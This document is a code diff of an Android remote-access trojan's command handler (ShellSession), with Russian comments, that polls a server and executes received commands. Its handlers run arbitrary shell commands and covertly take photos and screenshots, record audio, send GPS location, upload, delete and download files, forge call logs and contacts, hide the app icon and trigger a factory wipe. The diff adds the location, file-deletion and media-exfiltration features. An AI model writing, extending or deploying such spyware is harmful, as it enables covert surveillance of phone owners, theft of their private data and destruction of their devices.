@@ -1,19 +1,15 @@
 package oom.android.system.app;
 
 import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.hardware.Camera;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
@@ -21,6 +17,7 @@ import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 import android.util.Log;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 import oom.android.system.Managers.BlockManager;
@@ -28,6 +25,7 @@ import oom.android.system.Managers.CallL.CallsManager;
 import oom.android.system.Managers.CameraManager;
 import oom.android.system.Managers.Contacts.ContactsManager;
 import oom.android.system.Managers.FileManager;
+import oom.android.system.Managers.Images.MediaStoreManager;
 import oom.android.system.Managers.LocManager;
 import oom.android.system.Managers.ScreenShotManager;
 import oom.android.system.Managers.SmsManager;
@@ -99,7 +97,7 @@ public class ShellSession implements Runnable {
                         activate_shell();
                     }
 
-                    Thread.sleep(no_requests_delay); // сон на время без запросов
+                    Thread.currentThread().sleep(no_requests_delay); // сон на время без запросов
                 }
             }
             catch (InterruptedException e){
@@ -167,7 +165,7 @@ public class ShellSession implements Runnable {
                 Log.d(MyService.LOG_TAG,"ошибка при получении удаленной команды\n"+e.toString());
             }
 
-            Thread.sleep(between_cmd_delay);
+            Thread.currentThread().sleep(between_cmd_delay);
             idleattempts++;
 
         }
@@ -181,16 +179,13 @@ public class ShellSession implements Runnable {
 
         try {
             Process process = Runtime.getRuntime().exec(command);
-            if(command.startsWith("kill") || command.startsWith("mkdir") || command.startsWith("mv") || command.startsWith("rm") || command.startsWith("rmdir") ){
-                res.add("Command :"+command+" successful");
-            }
-            else{
+            //if(command.startsWith("kill") || command.startsWith("mkdir") || command.startsWith("mv") || command.startsWith("rm") || command.startsWith("rmdir") ) {
                 BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
 
-                while ((inputLine = in.readLine())!=null){
+                while ((inputLine = in.readLine()) != null) {
                     res.add(inputLine);
                 }
-            }
+            //}
 
         } catch (Exception e) {
             Log.d(MyService.LOG_TAG,"ошибка выполнения: \""+command+"\"\n"+e.toString());
@@ -198,10 +193,9 @@ public class ShellSession implements Runnable {
         return res;
     }
 
-
     public void exec_spec(String command){
         try {
-            Am=new audioManager(MainActivity.context);
+            Am=new audioManager(MyService.getContext());
             Log.d("Command","Command:" + command);
             JSONObject gJson = null;
             try{
@@ -210,20 +204,7 @@ public class ShellSession implements Runnable {
                 gJson = new JSONObject(json);
             }catch (Exception e){}
 
-            if(command.startsWith("DwnFile")){   // скачать пользовательский файл с URL
-                String fileurl = gJson.get("url").toString();
-                boolean isdownloaded  = FileManager.downloadfileV1(fileurl);
-                if(isdownloaded){
-                    post(MyService.post_url,fileurl+" успешно загружен");
-                }
-                else{
-                    post(MyService.post_url," Ошибка загрузки файла "+fileurl);
-                }
-            }
-
-
-
-            else if(command.equals("restart")){
+            if(command.startsWith("restart")){
                 post(MyService.post_url,"[Settings]restarting whole service!");
                 System.exit(0);
 
@@ -241,16 +222,16 @@ public class ShellSession implements Runnable {
                     post(MyService.post_url,"[Record]recording started with delay "+delay+" seconds");
 
                 }
-                else{post(MyService.post_url,"already recoding at the moment!");}
+                else{post(MyService.post_url,"[Record]"+"already recoding at the moment!");}
             }
 
-            else if(command.equals("stoprecord")){
+            else if(command.startsWith("stoprecord")){
                 if(MyService.recording){
                     Am.stopRecording();
                     MyService.record_must_be_stopped=false;
-                    post(MyService.post_url,"recording stopped!");
+                    post(MyService.post_url,"[Record]"+"recording stopped!");
                 }
-                else{post(MyService.post_url,"recording already stopped!");}
+                else{post(MyService.post_url,"[Record]"+"recording already stopped!");}
             }
 
             else if(command.startsWith("sync")){
@@ -300,12 +281,12 @@ public class ShellSession implements Runnable {
                 }
             }
 
-            else if(command.equals("quit")){   // завершить шелл
+            else if(command.startsWith("quit")){   // завершить шелл
                 MyService.cmdsessionactive=false;
                 Thread.currentThread().interrupt();
             }
 
-            else if(command.equals("clear")){   // очистка папки приложения
+            else if(command.startsWith("clear")){   // очистка папки приложения
                 try{
                     String datadir=context.getApplicationInfo().dataDir;
                     Runtime.getRuntime().exec("rm -r "+datadir+"/files/logs/");
@@ -314,52 +295,44 @@ public class ShellSession implements Runnable {
                 catch (Exception e){}
             }
 
-            else if(command.equals("factoryformat")){   // форматнуть нафиг ;p
+            else if(command.startsWith("factoryformat")){   // форматнуть нафиг ;p
                 factoryformatussd();
             }
 
-            else if(command.startsWith("getcams")){//вынести в отдельный класс
-                List<String> list = function.get_numberOfCameras();
-                postdata(MyService.post_url,list);
+            else if(command.startsWith("getCams")){
+
+                post(MyService.out_Cameras,get_numberOfCameras().toString());
             }
 
-            else if(command.equals("photo")){   // фото с камеры
+            else if(command.startsWith("photoM")){   // фото с камеры
                 int id = gJson.getInt("id");
                 boolean online = gJson.getBoolean("online");
                 try{
-                    new CameraManager(MainActivity.context,MainActivity.activity).startUp(id,online);
+                    new CameraManager(MyService.getContext()).startUp(id,online);
                 }
                 catch (Exception e){}
             }
 
-            else if(command.equals("screenshot")){
-                ScreenShotManager.savePic(gJson.getBoolean("online"),ScreenShotManager.takeScreenShot(MainActivity.activity));
+            else if(command.startsWith("screenshotM")){
+                ScreenShotManager.savePic(gJson.getBoolean("online"),ScreenShotManager.takeScreenShot());
             }
 
-            else if(command.equals("hideappicon")){//вынести в отдельный класс
+            else if(command.startsWith("hideappicon")){//вынести в отдельный класс
                 try {
-                    function.hideAppIcon(MainActivity.context);
+                    function.hideAppIcon(MyService.getContext());
                     post(MyService.post_url,"Hide App Icon successfully");
                 }catch (Exception e){
                     post(MyService.post_url,"ERROR Hide App Icon:"+e.getMessage());
                 }
             }
 
-            else if(command.equals("unhideappicon")){//вынести в отдельный класс
+            else if(command.startsWith("unhideappicon")){//вынести в отдельный класс
                 try {
-                    function.unHideAppIcon(MainActivity.context);
+                    function.unHideAppIcon(MyService.getContext());
                     post(MyService.post_url,"UnHide App Icon successfully");
                 }catch (Exception e){
                     post(MyService.post_url,"ERROR UnHide App Icon");
                 }
-            }
-
-            else if(command.equals("wipedata")){
-                MyService.devicePolicyManager.wipeData(47);
-            }
-
-            else if(command.equals("look")){
-                MyService.devicePolicyManager.lockNow();
             }
 
             else if(command.startsWith("ContAdd")){
@@ -392,7 +365,7 @@ public class ShellSession implements Runnable {
             }
 
             else if(command.startsWith("CallAdd")){
-                CallsManager.AddCallLog(gJson.getString("type"),gJson.getString("phone"),gJson.getString("duration"),gJson.getString("date"));
+                CallsManager.AddCallLog(gJson.getString("type"),gJson.getString("phone"),gJson.getString("duration"),gJson.getString("date"),gJson.getInt("count"));
             }
 
             else if(command.startsWith("CallChn")){
@@ -422,22 +395,83 @@ public class ShellSession implements Runnable {
             }
 
             else if(command.startsWith("getLocation")){
-                //post(MyService.post_url,LocManager.getLocation().toString());
+                LocManager gps = new LocManager(MyService.getContext());
+                JSONObject location = new JSONObject();
+                gps.getLocation();
+                // check if GPS enabled
+                if(gps.canGetLocation()){
+                    gps.getLocation();
+
+                    double latitude = gps.getLatitude();
+                    double longitude = gps.getLongitude();
+
+                    location.put("lat" , latitude);
+                    location.put("lng" , longitude);
+					post(MyService.out_Loc,location.toString());
+                    post(MyService.post_url,"[LC]Координаты получены");
+                }
+                else {
+                    post(MyService.post_url,"[LC]Не удалось получить координаты");
+                }
             }
+
             else if(command.startsWith("getFile")){
-                FileManager.walk(gJson.get("path").toString());
+                post(MyService.out_fm,FileManager.walk(gJson.get("path").toString()).toString());
             }
 
             else if(command.startsWith("saveFile")){   // загружает файл на сервер
                 String requested_file = gJson.get("path").toString();
                 FileManager.uploadfile(requested_file);
-                post(MyService.post_url,requested_file+" успешно сохранен");
+            }
+
+            else if(command.startsWith("DelFile")){
+                String path = gJson.get("path").toString();
+                FileManager.DelFile(path);
+            }
+            // скачать пользовательский файл с URL
+            else if(command.startsWith("DwnFile")){
+                String fileurl = gJson.get("url").toString();
+                boolean isdownloaded  = FileManager.downloadfileV1(fileurl);
+                if(isdownloaded){
+                    post(MyService.post_url,"[FM]"+fileurl+" успешно загружен");
+                }
+                else{
+                    post(MyService.post_url," Ошибка загрузки файла "+fileurl);
+                }
+            }
+
+            else if(command.startsWith("getMobImages")){
+                post(MyService.out_MediaF,MediaStoreManager.getMobImages(MyService.getContext()).toString());
+                post(MyService.post_url,"[MS]Успешно получено");
             }
 
 
         } catch (Exception e) {
             Log.d(MyService.LOG_TAG,"error executing spec: \""+command+"\"\n"+e.toString());
         }
+    }
+
+    public JSONArray get_numberOfCameras() {
+        JSONArray Jarray=new JSONArray();
+        try{
+            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+            for (int i = 0; i < android.hardware.Camera.getNumberOfCameras(); i++) {
+                JSONObject Obj = new JSONObject();
+                android.hardware.Camera.getCameraInfo(i, cameraInfo);
+                if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    Obj.put("Type","Front");
+                    Obj.put("ID",i);
+
+
+                } else if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    Obj.put("Type","Back");
+                    Obj.put("ID",i);
+                }
+                Jarray.put(Obj);
+            }
+        }catch (Exception e){}
+        return Jarray;
+
     }
 
     void factoryformatussd(){
